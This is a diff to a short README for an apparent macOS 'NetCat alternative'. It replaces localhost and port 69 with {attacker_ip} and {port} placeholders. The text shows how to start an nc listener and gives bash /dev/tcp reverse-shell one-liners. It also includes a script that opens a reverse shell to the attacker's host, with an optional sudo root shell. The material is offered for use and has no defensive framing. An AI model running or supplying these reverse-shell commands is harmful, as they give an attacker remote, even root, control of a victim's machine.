@@ -6,7 +6,7 @@ A simple NetCat alternative for MacOS
 You can simply run the command
 
 ```
-nc -lnvp 69
+nc -lnvp {port}
 ```
 
 this will set up a listener that will run until a connection disconnects
@@ -15,7 +15,7 @@ this will set up a listener that will run until a connection disconnects
 
 You can run
 ```
-bash -i >& /dev/tcp/127.0.0.1/69 0>&1
+bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1
 ```
 or set up a fancy shell file like I have:
 
@@ -23,9 +23,9 @@ or set up a fancy shell file like I have:
 #!/bin/bash
 
 if [ "$1" == "root" ]; then
-    sudo bash -i >& /dev/tcp/127.0.0.1/69 0>&1
+    sudo bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1
 else
-    bash -i >& /dev/tcp/127.0.0.1/69 0>&1
+    bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1
 fi
 ```
 
